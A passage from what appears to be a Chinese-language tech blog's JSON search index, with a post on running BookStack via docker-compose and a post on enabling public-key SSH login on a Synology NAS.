md檔案(字體太小)\n或者是boostnote(只能在本機)\n都或多或少有點小缺點\nBookstack則是沒有這些問題，不過就是系統「大」了點\u0026hellip;\n不過還好有人做成docker的方式來啟動，大大的降低了建置的難度(其實也沒有很難啦，只是要裝個PHP、弄個DB而已)\n這個是專案的名稱\nsolidnerd/docker-bookstack gihub上的連結\nhttps://github.com/solidnerd/docker-bookstack\n因為都轉成docker了，所以安裝很簡單 先git clone回來\ngit clone https://github.com/solidnerd/docker-bookstack 然後依照他的說明，建立一個docker-compose.yml檔案，再視情況修改\n底下是我的docker-compose.yml內容\nversion: \u0026#39;2\u0026#39; services: mysql: image: mysql:5.7.21 environment: - MYSQL_ROOT_PASSWORD=secret - MYSQL_DATABASE=bookstack - MYSQL_USER=bookstack - MYSQL_PASSWORD=secret volumes: - mysql-data:/var/lib/mysql bookstack: image: solidnerd/bookstack:0.24.1 depends_on: - mysql environment: - DB_HOST=mysql:3306 - DB_DATABASE=bookstack - DB_USERNAME=bookstack - DB_PASSWORD=secret volumes: - uploads:/var/www/bookstack/public/uploads - storage-uploads:/var/www/bookstack/public/storage ports: - \u0026#34;0.0.0.0:8003:80\u0026#34; volumes: mysql-data: uploads: storage-uploads: 原則上我沒有修改什麼設定，先確認一下現在的bookstack版本 0.24.1 是目前最新的了\n然後把 port 改成8003 ，避免去強碰 80 port\n如果前面搭配 caddy 之類的反向代理，那不用去記 port 也沒關係。\n好了之後，就執行 docker-compose up -d\n然後 docker ps -a 看一下執行狀況\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 6b3333eabf30 solidnerd/bookstack:0.24.1 \u0026#34;/docker-entrypoint.…\u0026#34; 4 hours ago Exited (0) About an hour ago docker-bookstack_bookstack_1 b8d74048eba1 mysql:5.7.21 \u0026#34;docker-entrypoint.s…\u0026#34; 4 hours ago Exited (0) About an hour ago docker-bookstack_mysql_1 應該可以順利跑起來\n沒啥難度，簡單作一下紀錄\n後面再來看看能不能在一個地方新增 md 檔案，然後可以自動傳到 hexo/hugo/ghost 的目錄，接著自動生成靜態檔案出來\u0026hellip;\n","date":"2018-11-06T14:57:14+08:00","permalink":"https://h.cowbay.org/post/bookstack-docker/","title":"Bookstack Docker"},{"content":"公司內有幾台NAS，其中有一台用來放開發人員的postgresql dump file 之前都是主要的開發人員上傳到google drive，分享出來 ，然後其他人去抓回來\n這樣子有個問題是，當server要存取這些檔案時，就沒辦法了，除非透過一些 3rd party的軟體 像是這篇\nhttps://www.omgubuntu.co.uk/2017/04/mount-google-drive-ocamlfuse-linux\n或者是這篇\nhttps://www.maketecheasier.com/mount-google-drive-ubuntu/\n但是手邊的伺服器，原則上除非有必要，不然都沒有開放internet 所以導致明明檔案就在那邊，但是要取得就是很麻煩\nDev_A upload to google drive \u0026mdash;\u0026gt; Dev_B Download from google drive \u0026mdash;\u0026gt; Dev_B scp download file to me \u0026mdash;\u0026gt; I upload to server.\n有沒有？是不是很stupid (講話一定要烙英文)\n既然有現成的NAS在那邊，幹嘛不用呢？(攤手)\n聽說之前的人一直沒成功弄出來，讓Server可以直接去NAS存取檔案的方式，我記得這個不是很難啊 就順手整理一下\n新增使用者帳號/ 確認家目錄存在 在NAS 的管理界面上新增一個帳號，假設叫 eric 好了\n建立時，注意一下要指定家目錄路徑\n更正： 群暉的界面好像不能指定家目錄\n預設的路徑如下\neric:x:1071:100::/var/services/homes/eric:/sbin/nologin 不過我覺得怪怪的，因為在我手邊的幾台NAS底下 /var/services/homes 都切不過去 確認一下路徑，發現那個 @fake_home_link 根本就不存在啊！\nadmin@storage:/volume1$ ls -lart /var/services/homes lrwxrwxrwx 1 root root 24 May 23 14:14 /var/services/homes -\u0026gt; /volume1/@fake_home_link admin@storage:/volume1$ 我在想是不是之前的人有改過什麼.. anyway ，反正先不管這邊，直接修改 /etc/passwd檔案\nsudo vim /etc/passwd 修正到正確的路徑，順便把shell 也改掉，不然不能登入\neric:x:1071:100::/volume1/homes/eric:/bin/sh 修改 /etc/ssh/sshd_config 再來修正預設沒有啟用 Publickey 驗證的 ssh\nsudo vim /etc/ssh/sshd_config 確認底下三行存在\nRSAAuthentication yes PubkeyAuthentication yes AuthorizedKeysFile\t.ssh/authorized_keys 將KEY傳到 NAS上 先建立相關目錄，順便修正一下目錄權限\nchmod 755 /volume1/homes/eric mkdir -p /volume1/homes/eric/.ssh chmod 700 /volume1/homes/eric/.ssh 再來把Publickey 傳到NAS，複製貼上也好，ssh-copy-id也可以，同時修正權限\nvim /volume1/homes/eric/.ssh/authorized_keys chmod 0600 /volume1/eric/.ssh/authorized_keys 重啟SSH 本來這個步驟應該可以用\nsynoservicectl --restart sshd 來解決 但是實際上這個指令只會把你踢出 SSH session \u0026hellip;.( WTF!!! )\n所以還是要去NAS的管理界面，去關閉再打開SSH (有點蠢..) 然後就可以測試用Publickey 來登入NAS了\n2018-11-05 14:47:12 [mini@s009 ansiblecontrol]$ ssh admin@storage admin@storage:~$ 確認免密碼登入無誤了！\n","date":"2018-11-05T14:16:54+08:00","permalink":"https://h.cowbay.org/post/enable-synology-public-ssh/","title":"筆記- 啟用群暉NAS (Synology NAS)的SSH Server  透過Publickey 認證免密碼登入"},{"content":" ","date":"2018-11-05T07:46:53+08:00","permalink":"https://h.cowbay.org/post/sammy93/","title":"Sammy93"}]